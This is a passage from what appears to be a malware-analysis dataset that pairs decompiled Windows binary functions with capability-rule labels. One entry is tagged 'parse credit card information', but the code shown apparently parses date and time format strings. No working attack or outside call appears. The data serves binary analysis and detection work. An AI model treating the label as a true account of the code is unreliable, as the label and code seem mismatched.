piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[7] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 4;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'H':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[4] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 8;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'I':\n        case 'O':\n            while( true ) {\n                uVar4 = piVar16 != NULL && uStack384 == 0xffff;\n                uVar19 = uStack384 == 0xffff;\n                uVar3 = uVar4;\n                if (uVar4) {\n                    if (piVar16[2] < piVar16[3]) {\n                        iVar7 = *piVar16[2];\n                    }\n                    else {\n                        in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar4;\n                        iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                        uVar4 = in_stack_fffffffffffffe28;\n                    }\n                    uVar19 = 0;\n                    uVar3 = uVar4;\n                    if (iVar7 == -1) {\n                        piVar16 = NULL;\n                        uVar3 = 0;\n                        uStack392 = NULL;\n                        uVar19 = uVar4;\n                    }\n                }\n                bVar20 = piVar15 != NULL && bVar17;\n                bVar18 = bVar17;\n                if (bVar20) {\n                    if (piVar15[2] < piVar15[3]) {\n                        iVar7 = *piVar15[2];\n                    }\n                    else {\n                        in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar3;\n                        iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                        uVar3 = in_stack_fffffffffffffe28;\n                    }\n                    bVar18 = iVar7 == -1 && bVar20;\n                    if (iVar7 == -1) {\n                        piVar15 = NULL;\n                    }\n                }\n                if (uVar19 == bVar18) break;\n                if (uVar3 != 0) {\n                    if (piVar16[2] < piVar16[3]) {\n                        iVar7 = *piVar16[2];\n                    }\n                    else {\n                        iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                    }\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                        piVar16 = NULL;\n                    }\n                }\n                cVar2 = (**(*piVar10 + 0x10))(piVar10);\n                if (cVar2 == '\\0') break;\n                if (piVar16[2] < piVar16[3]) {\n                    piVar16[2] = piVar16[2] + 2;\n                }\n                else {\n                    (**(*piVar16 + 0x50))(piVar16);\n                }\n                uStack384._0_2_ = 0xffff;\n                uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n            }\n            break;\n        case 'K':\n            piStack360 = *(*(arg_90h + 0x10) + 0x40);\n            piStack352 = *(*(arg_90h + 0x10) + 0x48);\n            if ((*piStack360 != 0) && (*piStack352 != 0)) {\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piStack440 = piVar15;\n                piStack432 = arg_88h;\n                fcn.140038e30(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &piStack360, 2, in_stack_00000028\n                              , &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                              CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h, \n                              arg_90h);\n                uStack392 = piStack408;\n                uStack384 = uStack384 & 0xffff0000 | uStack400;\n                piVar16 = piStack408;\n                uStack384._0_2_ = uStack400;\n                uVar21 = uStack368;\n                if ((uStack368 == 0) && (uStack364 != 0)) {\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                    piVar16 = piStack408;\n                }\n            }\n            break;\n        case 'M':\n            goto code_r0x00014003af20;\n        case 'R':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[6] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'S':\ncode_r0x00014003af20:\n            uStack420 = uStack392._4_4_;\n            uStack424 = uStack392;\ncode_r0x00014003ab92:\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.140039d50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            break;\n        case 'T':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                bVar20 = uStack400 == 0xffff;\n                if ((piStack408 != NULL) && (bVar20)) {\n                    if (piStack408[2] < piStack408[3]) {\n                        iVar7 = *piStack408[2];\n                    }\n                    else {\n                        iVar7 = (**(*piStack408 + 0x48))();\n                    }\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                    }\n                    bVar20 = iVar7 == -1;\n                }\n                bVar5 = bVar17;\n                bVar13 = bVar18;\n                if (bVar18) {\n                    if (piVar15[2] < piVar15[3]) {\n                        iVar7 = *piVar15[2];\n                    }\n                    else {\n                        iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                    }\n                    if (iVar7 == -1) {\n                        piVar15 = NULL;\n                        bVar13 = false;\n                        bVar5 = bVar18;\n                    }\n                    else {\n                        bVar5 = false;\n                    }\n                }\n                uVar14 = uStack364;\n                if (bVar20 == bVar5) {\ncode_r0x00014003b930:\n                    if (uVar14 < 0x45) {\n                        uVar14 = uVar14 + 100;\n                    }\n                }\n                else {\n                    fcn.140029f90(&uStack392);\n                    cVar2 = (**(*piVar10 + 0x60))();\n                    piVar16 = uStack392;\n                    if (9 < cVar2 - 0x30U) goto code_r0x00014003b930;\n                    uVar14 = (cVar2 - 0x30U) + uVar14 * 10;\n                    piVar12 = uStack392[3];\n                    if (uStack392[2] < piVar12) {\n                        piVar11 = uStack392[2] + 1;\n                        uStack392[2] = piVar11;\n                    }\n                    else {\n                        (**(*uStack392 + 0x50))();\n                        piVar11 = piVar16[2];\n                        piVar12 = piVar16[3];\n                    }\n                    uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                    uStack364 = uVar14;\n                    if (piVar11 < piVar12) {\n                        iVar7 = *piVar11;\n                    }\n                    else {\n                        iVar7 = (**(*piVar16 + 0x48))();\n                    }\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                    }\n                    bVar18 = bVar17;\n                    if (bVar13 != false) {\n                        if (piVar15[2] < piVar15[3]) {\n                            iVar8 = *piVar15[2];\n                        }\n                        else {\n                            iVar8 = (**(*piVar15 + 0x48))(piVar15);\n                        }\n                        if (iVar8 == -1) {\n                            piVar15 = NULL;\n                            bVar18 = bVar13;\n                        }\n                        else {\n                            bVar18 = false;\n                        }\n                    }\n                    if ((iVar7 == -1) != bVar18) {\n                        fcn.140029f90(&uStack392);\n                        cVar2 = (**(*piVar10 + 0x60))(piVar10);\n                        if (cVar2 - 0x30U < 10) {\n                            if (uStack392[2] < uStack392[3]) {\n                                uStack392[2] = uStack392[2] + 2;\n                            }\n                            else {\n                                (**(*uStack392 + 0x50))(uStack392);\n                            }\n                            uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                            uStack364 = uVar14 * 10 + cVar2 + -0x30;\n                        }\n                    }\n                    uVar14 = uStack364 - 0x76c;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                }\n                in_stack_00000038[5] = uVar14;\n                piVar16 = uStack392;\n                uStack384._0_2_ = uStack384;\n            }\n        }\ncode_r0x000140039f81:\n        noname_11 = noname_11 + 1;\n        bVar18 = uStack384 == 0xffff;\n        if ((piVar16 == NULL) || (bVar20 = bVar18,  !bVar18)) goto code_r0x000140039e60;\ncode_r0x000140039fa1:\n        if (piVar16[2] < piVar16[3]) {\n            iVar7 = *piVar16[2];\n        }\n        else {\n            iVar7 = (**(*piVar16 + 0x48))(piVar16);\n        }\n        if (iVar7 == -1) {\n            uStack392 = NULL;\n        }\n        bVar18 = iVar7 == -1;\n        bVar13 = piVar15 != NULL && bVar17;\n        if (piVar15 == NULL || !bVar17) goto code_r0x000140039e73;\ncode_r0x000140039fd8:\n        if (piVar15[2] < piVar15[3]) {\n            iVar7 = *piVar15[2];\n        }\n        else {\n            iVar7 = (**(*piVar15 + 0x48))(piVar15);\n        }\n        if (iVar7 == -1) {\n            piVar15 = NULL;\n        }\n        else {\n            bVar13 = false;\n        }\n        if (bVar18 == bVar13) goto code_r0x00014003a010;\n    } while( true );\n}\n",
        "token_count": 11755
    },
    "140062e1": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00014006b708) overlaps instruction at (ram,0x00014006b705)\n// \n// WARNING: Removing unreachable block (ram,0x00014006c884)\n// WARNING: Removing unreachable block (ram,0x00014006c88f)\n// WARNING: Removing unreachable block (ram,0x00014006ce90)\n// WARNING: Removing unreachable block (ram,0x00014006c893)\n// WARNING: Removing unreachable block (ram,0x00014006c940)\n// WARNING: Removing unreachable block (ram,0x00014006c951)\n// WARNING: Removing unreachable block (ram,0x00014006c8b0)\n// WARNING: Removing unreachable block (ram,0x00014006c95a)\n// WARNING: Removing unreachable block (ram,0x00014006c96b)\n// WARNING: Removing unreachable block (ram,0x00014006c981)\n// WARNING: Removing unreachable block (ram,0x00014006c8b3)\n// WARNING: Removing unreachable block (ram,0x00014006c8cb)\n// WARNING: Removing unreachable block (ram,0x00014006c8d3)\n// WARNING: Removing unreachable block (ram,0x00014006d0a0)\n// WARNING: Removing unreachable block (ram,0x00014006d0ae)\n// WARNING: Removing unreachable block (ram,0x00014006d0c6)\n// WARNING: Removing unreachable block (ram,0x00014006c8d6)\n// WARNING: Removing unreachable block (ram,0x00014006c8e4)\n// WARNING: Removing unreachable block (ram,0x00014006d1c0)\n// WARNING: Removing unreachable block (ram,0x00014006d1ce)\n// WARNING: Removing unreachable block (ram,0x00014006c8ed)\n// WARNING: Removing unreachable block (ram,0x00014006c8fa)\n// WARNING: Removing unreachable block (ram,0x00014006d0e0)\n// WARNING: Removing unreachable block (ram,0x00014006d4f6)\n// WARNING: Removing unreachable block (ram,0x00014006d50b)\n// WARNING: Removing unreachable block (ram,0x00014006c903)\n// WARNING: Removing unreachable block (ram,0x00014006c90d)\n// WARNING: Removing unreachable block (ram,0x00014006d1a0)\n// WARNING: Removing unreachable block (ram,0x00014006d0ee)\n// WARNING: Removing unreachable block (ram,0x00014006d0fb)\n// WARNING: Removing unreachable block (ram,0x00014006c923)\n// WARNING: Removing unreachable block (ram,0x00014006c92b)\n// WARNING: Switch with 1 destination removed at 0x00014010eefb : 256 cases all go to same destination\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * fcn.140062e10(int64_t *arg1, ulong arg2)\n\n{\n    uint8_t **ppuVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    ulong arg1_00;\n    uint uVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    char cVar7;\n    char cVar8;\n    uint8_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    int64_t *arg1_01;\n    int64_t *noname_11;\n    uint8_t *puVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    int64_t *piVar16;\n    char **arg3;\n    ulong uVar17;\n    char *pcVar18;\n    int64_t *piVar19;\n    ulong *puVar20;\n    int64_t *piVar21;\n    uint8_t uVar22;\n    uint8_t uVar23;\n    uint32_t uVar24;\n    char **arg1_02;\n    int64_t *piVar25;\n    uint64_t *puVar26;\n    uchar *puVar27;\n    uint8_t *puVar28;\n    int64_t *piVar29;\n    uint *in_R8;\n    uint *in_R9;\n    int64_t *piVar30;\n    int64_t *piVar31;\n    int64_t *piVar32;\n    bool bVar33;\n    bool bVar34;\n    uchar extraout_XMM0 [16];\n    uchar auVar35 [16];\n    uchar extraout_XMM0_00 [16];\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t in_stack_00000040;\n    uint32_t *in_stack_00000048;\n    uint64_t uStackY592;\n    uchar auStackY584 [32];\n    uint32_t *in_stack_fffffffffffffde8;\n    uint uVar37;\n    uint32_t *puVar36;\n    uint32_t *in_stack_fffffffffffffe00;\n    ulong in_stack_fffffffffffffe08;\n    ulong in_stack_fffffffffffffe18;\n    uchar *arg_70h;\n    uchar *arg4;\n    code *pcVar38;\n    uint32_t uVar39;\n    uint8_t in_stack_fffffffffffffe34;\n    uchar in_stack_fffffffffffffe35;\n    uchar in_stack_fffffffffffffe36;\n    char cVar40;\n    uchar in_stack_fffffffffffffe37;\n    int32_t iStack448;\n    uchar auStack456 [12];\n    uchar auStack456_00 [16];\n    uchar auStack440 [8];\n    uint uStack432;\n    uint uStack428;\n    int64_t *piStack424;\n    uint32_t uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    uint32_t uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint32_t uStack384;\n    uint uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    char *pcStack360;\n    char *pcStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    int64_t *piStack312;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uchar auStack280 [16];\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uchar auStack216 [16];\n    uchar auStack200 [16];\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    \n    uVar37 = in_stack_fffffffffffffe18 >> 0x20;\n    puVar27 = auStackY584;\n    piVar25 = auStackY584;\n    piVar29 = NULL;\n    uStack392 = *in_R8;\n    uStack388 = in_R8[1];\n    uStack384 = in_R8[2];\n    uStack380 = in_R8[3];\n    uStack408 = *in_R9;\n    uStack404 = in_R9[1];\n    uStack400 = in_R9[2];\n    uStack396 = in_R9[3];\n    arg1_02 = in_stack_00000028 + 0xd0;\n    iVar12 = fcn.1400b9730(arg1_02);\n    arg1_01 = fcn.1400b97f0(arg1_02);\n    noname_11 = sub.msvcrt.dll_strlen();\n    piVar30 = uStack384;\n    piVar19 = CONCAT44(uStack388, uStack392);\n    uVar39 = 0;\n    piVar32 = CONCAT44(uStack404, uStack408);\n    arg_70h = CONCAT44(uVar37, uStack400);\n    uStack368 = 0;\n    pcVar38 = 0x14002baf0;\n    piVar21 = piVar30;\n    do {\n        bVar33 = piVar30 == -1;\n        arg3 = arg1_02 & 0xffffffffffffff00 | bVar33;\n        uVar22 = piVar19 != NULL && bVar33;\n        uVar23 = bVar33;\n        if (uVar22) {\n            if ((piVar19[2] < piVar19[3]) ||\n               (iVar10 = (**(*piVar19 + 0x48))(),  in_stack_fffffffffffffe34 = uVar22,  iVar10 != -1)) {\n                uVar23 = 0;\n            }\n            else {\n                uStack392 = 0;\n                uStack388 = 0;\n                uVar23 = uVar22;\n            }\n        }\n        bVar34 = arg_70h == -1;\n        piVar31 = piVar21 & 0xffffffffffffff00;\n        if ((piVar32 == NULL) || (!bVar34)) {\n            uVar23 = uVar23 ^ bVar34;\n        }\n        else if ((piVar32[3] <= piVar32[2]) &&\n                (iVar10 = (**(*piVar32 + 0x48))(),  in_stack_fffffffffffffe34 = uVar23,  iVar10 == -1)) {\n            uStack408 = 0;\n            uStack404 = 0;\n            uVar23 = uVar23 ^ 1;\n        }\n        if ((noname_11 <= piVar29) || (uVar23 == 0)) {\n            if ((uVar39 == 0) && (piVar29 == noname_11)) goto code_r0x000140063260;\ncode_r0x00014006325c:\n            *in_stack_00000030 = *in_stack_00000030 | 4;\ncode_r0x000140063260:\n            *arg1 = uStack392;\n            *(arg1 + 4) = uStack388;\n            *(arg1 + 1) = uStack384;\n            *(arg1 + 0xc) = uStack380;\n            return arg1;\n        }\n        if (uVar39 != 0) goto code_r0x00014006325c;\n        puVar28 = in_stack_00000040 + piVar29;\n        uVar15 = *puVar28;\n        uVar23 = *(arg1_01 + uVar15 + 0x139);\n        if (uVar23 == 0) {\n            uVar23 = *puVar28;\n            if (*(*arg1_01 + 0x40) != pcVar38) {\n                uVar23 = (**(*arg1_01 + 0x40))();\n            }\n            if (uVar23 != 0) {\n                *(arg1_01 + uVar15 + 0x139) = uVar23;\n                goto code_r0x000140062fac;\n            }\ncode_r0x000140062fb4:\n            puVar13 = arg1_01[6];\n            piVar19 = CONCAT44(uStack388, uStack392);\n            if ((puVar13[*puVar28 * 2] & 0x20) != 0) {\n                piVar32 = CONCAT44(uStack404, uStack408);\n                do {\n                    uVar23 = piVar30 == -1;\n                    uVar24 = puVar13 & 0xffffff00;\n                    uVar9 = piVar19 != NULL && uVar23;\n                    uVar22 = in_stack_fffffffffffffe34;\n                    if (piVar19 != NULL && uVar23) {\n                        uVar15 = piVar19[3];\n                        if (uVar15 <= piVar19[2]) {\n                            uVar23 = uVar9;\n                            uVar15 = (**(*piVar19 + 0x48))();\n                            uVar24 = uVar15;\n                            uVar22 = uVar23;\n                            uVar9 = uVar23;\n                            if (uVar24 == 0xffffffff) {\n                                uStack392 = 0;\n                                uStack388 = 0;\n                                piVar19 = NULL;\n                                uVar9 = false;\n                                goto code_r0x0001400630a8;\n                            }\n                        }\n                        uVar23 = 0;\n                        uVar24 = uVar15 & 0xffffff00 | (piVar32 != NULL && bVar34);\n                        in_stack_fffffffffffffe34 = uVar22;\n                        uVar6 = 0;\n                        if (piVar32 == NULL || !bVar34) goto code_r0x0001400630b5;\ncode_r0x000140063130:\n                        in_stack_fffffffffffffe34 = uVar9;\n                        arg3 = uVar24;\n                        uVar9 = in_stack_fffffffffffffe34;\n                        if ((piVar32[2] < piVar32[3]) ||\n                           (iVar10 = (**(*piVar32 + 0x48))(),  uVar22 = in_stack_fffffffffffffe34, \n                           uVar9 = in_stack_fffffffffffffe34,  iVar10 != -1)) {\n                            arg3 = NULL;\n                            in_stack_fffffffffffffe34 = uVar22;\n                        }\n                        else {\n                            uStack408 = 0;\n                            uStack404 = 0;\n                            piVar32 = NULL;\n                        }\n                    }\n                    else {\ncode_r0x0001400630a8:\n                        uVar24 = uVar24 & 0xffffff00 | (piVar32 != NULL && bVar34);\n                        in_stack_fffffffffffffe34 = uVar22;\n                        uVar6 = uVar23;\n                        if (piVar32 != NULL && bVar34) goto code_r0x000140063130;\ncode_r0x0001400630b5:\n                        uVar23 = uVar6;\n                        arg3 = piVar21 & 0xffffff00 | bVar34;\n                    }\n                    if (uVar23 == arg3) goto code_r0x00014006305d;\n                    piVar16 = piVar30;\n                    if (uVar9 == 0) {\ncode_r0x0001400630c8:\n                        if ((*(arg1_01[6] + (piVar16 & 0xff) * 2) & 0x20) == 0) goto code_r0x00014006305d;\n                        puVar13 = piVar19[2];\n                        if (puVar13 < piVar19[3]) goto code_r0x0001400630e3;\n                        puVar13 = (**(*piVar19 + 0x50))();\n                    }\n                    else {\n                        puVar13 = piVar19[2];\n                        if (piVar19[3] <= puVar13) {\n                            piVar16 = (**(*piVar19 + 0x48))();\n                            if (piVar16 == -1) {\n                                uStack392 = 0;\n                                uStack388 = 0;\n                                piVar19 = NULL;\n                            }\n                            goto code_r0x0001400630c8;\n                        }\n                        if ((*(arg1_01[6] + *puVar13 * 2) & 0x20) == 0) goto code_r0x00014006305d;\ncode_r0x0001400630e3:\n                        puVar13 = puVar13 + 1;\n                        piVar19[2] = puVar13;\n                    }\n                    uStack384 = 0xffffffff;\n                    piVar30 = 0xffffffff;\n                } while( true );\n            }\n            piVar31 = piVar31 | piVar19 != NULL;\n            cVar7 = (**(*arg1_01 + 0x20))(arg1_01);\n            uVar23 = bVar33 && piVar19 != NULL;\n            if ((uVar23) && (piVar31 = arg1_02 & 0xffffff00 | uVar23,  piVar19[3] <= piVar19[2])) {\n                iVar10 = (**(*piVar19 + 0x48))(piVar19);\n                in_stack_fffffffffffffe34 = uVar23;\n                if (iVar10 == -1) {\n                    piVar19 = NULL;\n                    uStack392 = 0;\n                    uStack388 = 0;\n                    piVar31 = NULL;\n                }\n                else {\n                    piVar31 = uVar23;\n                }\n            }\n            cVar8 = (**(*arg1_01 + 0x20))(arg1_01);\n            if (cVar7 == cVar8) {\ncode_r0x000140063070:\n                piVar30 = 0xffffffff;\n                fcn.14009b630(piVar19);\n                piVar32 = CONCAT44(uStack404, uStack408);\n                uStack384 = 0xffffffff;\n            }\n            else {\n                cVar7 = (**(*arg1_01 + 0x10))(arg1_01);\n                if ((((bVar33) && (piVar31 != '\\0')) && (piVar19[3] <= piVar19[2])) &&\n                   (iVar10 = (**(*piVar19 + 0x48))(piVar19),  iVar10 == -1)) {\n                    uStack392 = 0;\n                    uStack388 = 0;\n                }\n                cVar8 = (**(*arg1_01 + 0x10))();\n                piVar19 = CONCAT44(uStack388, uStack392);\n                if (cVar7 == cVar8) goto code_r0x000140063070;\n                uVar39 = 4;\n                piVar19 = CONCAT44(uStack388, uStack392);\n                uStack368 = 4;\n                piVar32 = CONCAT44(uStack404, uStack408);\n            }\n            goto code_r0x00014006305d;\n        }\ncode_r0x000140062fac:\n        if (uVar23 != 0x25) goto code_r0x000140062fb4;\n        piVar32 = piVar29 + 1;\n        piVar21 = arg1_01;\n        cVar7 = fcn.14002ba20(arg1_01, *(in_stack_00000040 + 1 + piVar29), 0);\n        uStack364 = 0;\n        if ((cVar7 == 'E') || (cVar7 == 'O')) {\n            piVar32 = piVar29 + 2;\n            piVar21 = arg1_01;\n            cVar7 = fcn.14002ba20(arg1_01, *(in_stack_00000040 + 2 + piVar29), 0);\n            uVar23 = cVar7 - 0x25;\n            auVar35 = extraout_XMM0_00;\n            if (uVar23 < 0x55) goto code_r0x0001400631b2;\ncode_r0x000140063340:\n            uStack368 = 4;\n            piVar19 = CONCAT44(uStack388, uStack392);\n            piVar29 = piVar32;\n            uVar39 = 4;\n            goto code_r0x000140063360;\n        }\n        uVar23 = cVar7 - 0x25;\n        auVar35 = extraout_XMM0;\n        if (0x54 < uVar23) goto code_r0x000140063340;\ncode_r0x0001400631b2:\n        uVar14 = *(uVar23 * 4 + 0x14010b7c8);\n        auStack280._0_8_ = uVar14 + 0x14010b7c8;\n        bVar33 = (POPCOUNT(auStack280._0_8_ & 0xff) & 1U) == 0;\n        cVar7 = auStack280._0_8_;\n        uVar22 = piVar21;\n        uVar37 = in_stack_fffffffffffffde8 >> 0x20;\n    // switch table (85 cases) at 0x14010b7c8\n        switch(uVar23) {\n        case 0:\n            cVar7 = fcn.140029e90(&uStack392);\n            if (*(arg1_01 + 7) == '\\0') {\n                cVar8 = fcn.14002b9d0(arg1_01, 0x25);\n            }\n            else {\n                cVar8 = *(arg1_01 + 0x5e);\n            }\n            if (cVar7 == cVar8) {\n                piVar19 = CONCAT44(uStack388, uStack392);\n                piVar30 = 0xffffffff;\n                fcn.14009b630(piVar19);\n                uStack384 = 0xffffffff;\n                piVar29 = piVar32;\n            }\n            else {\ncode_r0x0001400640ac:\n                piVar30 = uStack384;\n                uStack368 = 4;\n                piVar19 = CONCAT44(uStack388, uStack392);\n                piVar29 = piVar32;\n                uVar39 = 4;\n            }\n            break;\n        default:\n            goto code_r0x000140063340;\n        case 0x1c:\n        case 0x3c:\n            iVar2 = *(iVar12 + 0x10);\n            piStack312 = *(iVar2 + 0x88);\n            uStack304 = *(iVar2 + 0x90);\n            uStack300 = *(iVar2 + 0x94);\n            uStack296 = *(iVar2 + 0x98);\n            uStack292 = *(iVar2 + 0x9c);\n            uStack288 = *(iVar2 + 0xa0);\n            uStack284 = *(iVar2 + 0xa4);\n            uStack344 = *(iVar2 + 0x68);\n            uStack340 = *(iVar2 + 0x6c);\n            uStack336 = *(iVar2 + 0x70);\n            uStack332 = *(iVar2 + 0x74);\n            uStack328 = *(iVar2 + 0x78);\n            uStack324 = *(iVar2 + 0x7c);\n            uStack320 = *(iVar2 + 0x80);\n            uStack316 = *(iVar2 + 0x84);\n            auStack280 = *(iVar2 + 0xa8);\n            uStack264 = *(iVar2 + 0xb8);\n            uStack260 = *(iVar2 + 0xbc);\n            uStack256 = *(iVar2 + 0xc0);\n            uStack252 = *(iVar2 + 0xc4);\n            pcStack360 = *(iVar2 + 0x58);\n            pcStack352 = *(iVar2 + 0x60);\n            in_stack_fffffffffffffde8 = 0xe;\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140062200(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38, &uStack364, &pcStack360, 0xe, \n                          in_stack_00000028, &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11\n                          , arg_70h, pcVar38, iVar12, \n                          CONCAT17(in_stack_fffffffffffffe37, \n                                   CONCAT16(in_stack_fffffffffffffe36, \n                                            CONCAT15(in_stack_fffffffffffffe35, \n                                                     CONCAT14(in_stack_fffffffffffffe34, uVar39)))), \n                          CONCAT44(uStack404, uStack408));\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[6] = uStack364 % 7;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n            }\n            break;\n        case 0x1d:\n        case 0x3d:\n        case 0x43:\n            iVar2 = *(iVar12 + 0x10);\n            uStack264 = *(iVar2 + 0x128);\n            uStack260 = *(iVar2 + 300);\n            uStack256 = *(iVar2 + 0x130);\n            uStack252 = *(iVar2 + 0x134);\n            uStack248 = *(iVar2 + 0x138);\n            uStack244 = *(iVar2 + 0x13c);\n            uStack240 = *(iVar2 + 0x140);\n            uStack236 = *(iVar2 + 0x144);\n            uStack232 = *(iVar2 + 0x148);\n            uStack228 = *(iVar2 + 0x14c);\n            uStack224 = *(iVar2 + 0x150);\n            uStack220 = *(iVar2 + 0x154);\n            auStack216 = *(iVar2 + 0x158);\n            auStack200 = *(iVar2 + 0x168);\n            uStack184 = *(iVar2 + 0x178);\n            uStack180 = *(iVar2 + 0x17c);\n            uStack176 = *(iVar2 + 0x180);\n            uStack172 = *(iVar2 + 0x184);\n            uStack296 = *(iVar2 + 0x108);\n            uStack292 = *(iVar2 + 0x10c);\n            uStack288 = *(iVar2 + 0x110);\n            uStack284 = *(iVar2 + 0x114);\n            auStack280 = *(iVar2 + 0x118);\n            uStack344 = *(iVar2 + 0xd8);\n            uStack340 = *(iVar2 + 0xdc);\n            uStack336 = *(iVar2 + 0xe0);\n            uStack332 = *(iVar2 + 0xe4);\n            uStack328 = *(iVar2 + 0xe8);\n            uStack324 = *(iVar2 + 0xec);\n            uStack320 = *(iVar2 + 0xf0);\n            uStack316 = *(iVar2 + 0xf4);\n            piStack312 = *(iVar2 + 0xf8);\n            uStack304 = *(iVar2 + 0x100);\n            uStack300 = *(iVar2 + 0x104);\n            pcStack360 = *(iVar2 + 200);\n            pcStack352 = *(iVar2 + 0xd0);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            in_stack_fffffffffffffde8 = 0x18;\n            fcn.140062200(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38, &uStack364, &pcStack360, 0x18, \n                          in_stack_00000028, &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11\n                          , arg_70h, pcVar38, iVar12, \n                          CONCAT17(in_stack_fffffffffffffe37, \n                                   CONCAT16(in_stack_fffffffffffffe36, \n                                            CONCAT15(in_stack_fffffffffffffe35, \n                                                     CONCAT14(in_stack_fffffffffffffe34, uVar39)))), \n                          CONCAT44(uStack404, uStack408));\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 